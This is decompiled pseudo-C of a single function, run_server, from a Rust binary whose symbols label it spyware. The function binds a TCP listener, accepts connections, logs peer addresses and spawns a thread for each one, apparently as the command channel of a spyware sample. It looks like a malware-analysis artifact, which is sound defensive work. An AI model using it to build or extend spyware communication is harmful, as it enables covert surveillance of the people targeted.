
  int64_t (*)(int64_t* arg1, int64_t* arg2) spyware::communication::server::run_server::hf575f6adb91dbfb6(int16_t arg1)

{
    int16_t var_10a = arg1;
    void** const var_108 = &data_4b8d10;
    int64_t (* var_100)(int64_t* arg1, int64_t* arg2) =
        _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h412b806372427b66;
    int16_t* var_f8 = &var_10a;
    uint64_t (* var_f0)(int16_t* arg1, char* arg2) = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u16$GT$::fmt::hca7847b10460df25;
    void* const var_d8 = &data_4b8ca0;
    int64_t (* var_d0)(int64_t* arg1, int64_t* arg2) = 2;
    int64_t var_b8 = 0;
    void** const* var_c8 = &var_108;
    int64_t var_c0 = 2;
    void var_48;
    core::option::Option$LT$T$GT$::map_or_else::h31b26472792d6da3(&var_48, &var_d8);
    std::net::tcp::TcpListener::bind::he40e587fcbf7a57c(&var_d8, &var_48);
    
    if (var_d8 & 1)
        return var_d0;
    
    int32_t fd_1 = *var_d8[4];
    int16_t var_78;
    std::net::tcp::TcpListener::local_addr::h3c98181fce942115(&var_78, &fd_1);
    int32_t* var_e0;
    int64_t* var_a8;
    int64_t (* var_a0)(char* arg1);
    int128_t var_98;
    
    if (var_78 != 2)
    {
        int128_t var_68;
        int128_t var_88_1 = var_68;
        var_98 = var_78;
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3)
        {
            var_a8 = &var_98;
            var_a0 = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Debug$GT$::fmt::h5869d6b0d96760be;
            var_d8 = &data_4b8cc0;
            int64_t var_d0_2 = 1;
            int64_t var_b8_2 = 0;
            int64_t** var_c8_2 = &var_a8;
            int64_t var_c0_2 = 1;
            int64_t rax_6 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d20);
            var_108 = "spyware::communication::serverUn…";
            var_100 = 0x1e;
            var_f8 = "spyware::communication::serverUn…";
            int64_t var_f0_2 = 0x1e;
            int64_t var_e8_2 = rax_6;
            log::__private_api::log::h13afddf373bd7d7f(&var_d8, 3, &var_108);
        }
    }
    else
    {
        int32_t* var_70;
        var_e0 = var_70;
        
        if (core::sync::atomic::atomic_load::h8c88032dab18ab12())
        {
            var_a8 = &var_e0;
            var_98 = &var_a8;
            *var_98[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h2d488762f4f56181;
            var_d8 = &data_4b8cd0;
            int64_t var_d0_1 = 2;
            int64_t var_b8_1 = 0;
            int128_t* var_c8_1 = &var_98;
            int64_t var_c0_1 = 1;
            int64_t rax_4 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d38);
            var_108 = "spyware::communication::serverUn…";
            var_100 = 0x1e;
            var_f8 = "spyware::communication::serverUn…";
            int64_t var_f0_1 = 0x1e;
            int64_t var_e8_1 = rax_4;
            log::__private_api::log::h13afddf373bd7d7f(&var_d8, 1, &var_108);
        }
        
        core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_e0);
    }
    
    var_e0 = &fd_1;
    
    while (true)
    {
        _$LT$std..net..tcp..Incoming$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::hd0d557571d3ab98d(&var_a8, &var_e0);
        int32_t rax_7 = var_a8;
        
        if (!rax_7)
        {
            int32_t fd = *var_a8[4];
            
            if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3)
            {
                std::net::tcp::TcpStream::peer_addr::h9ccf6949693ba95c(&var_108, &fd);
                int16_t rax_13 = var_108;
                
                if (rax_13 == 2)
                {
                    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::hf7372bfdd8ef8cfe(fd);
                    core::ptr::drop_in_place$LT$std..net..tcp..TcpStream$GT$::hf7372bfdd8ef8cfe(
                        fd_1);
                    return var_100;
                }
                
                *var_98[6] = *var_108[6];
                *var_98[2] = *var_108[2];
                int128_t zmm0_2 = var_f8;
                int128_t var_58_1 = zmm0_2;
                var_98 = rax_13;
                *var_98[8] = var_100;
                int128_t var_88_2 = zmm0_2;
                var_78 = &var_98;
                int64_t (* var_70_1)(char* arg1) = _$LT$core..net..socket_addr..SocketAddr$u20$as$u20$core..fmt..Display$GT$::fmt::hb8f0b665671134da;
                var_d8 = &data_4b8cf0;
                int64_t var_d0_4 = 1;
                int64_t var_b8_4 = 0;
                int16_t* var_c8_4 = &var_78;
                int64_t var_c0_4 = 1;
                int64_t rax_14 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d68);
                var_108 = "spyware::communication::serverUn…";
                var_100 = 0x1e;
                var_f8 = "spyware::communication::serverUn…";
                int64_t var_f0_4 = 0x1e;
                int64_t var_e8_4 = rax_14;
                log::__private_api::log::h13afddf373bd7d7f(&var_d8, 3, &var_108);
            }
            
            int64_t var_c8_5 = -0x8000000000000000;
            var_d8 = nullptr;
            char var_b0_1 = 0;
            std::thread::Builder::spawn_unchecked::h25f5435683f80577(&var_108, &var_d8);
            core::result::Result$LT$T$C$E$GT$::expect::h3c826feadda953db(&var_d8, &var_108);
            core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$core..result..Result$LT$$LP$$RP$$C$std..io..error..Error$GT$$GT$$GT$::hc1f2d39e06124517(&var_d8);
        }
        else
        {
            if (rax_7 != 1)
                break;
            
            var_78 = var_a0;
            
            if (core::sync::atomic::atomic_load::h8c88032dab18ab12())
            {
                var_98 = &var_78;
                *var_98[8] = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
                var_d8 = &data_4b8d00;
                int64_t var_d0_3 = 1;
                int64_t var_b8_3 = 0;
                int128_t* var_c8_3 = &var_98;
                int64_t var_c0_3 = 1;
                int64_t rax_10 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8d98);
                var_108 = "spyware::communication::serverUn…";
                var_100 = 0x1e;
                var_f8 = "spyware::communication::serverUn…";
                int64_t var_f0_3 = 0x1e;
                int64_t var_e8_3 = rax_10;
                log::__private_api::log::h13afddf373bd7d7f(&var_d8, 1, &var_108);
            }
            
            core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_78);
        }
    }
    
    std::panicking::begin_panic::hb01f6b74cc5cddb3("Server closed unexpectedlyfailed…");
    /* no return */
}
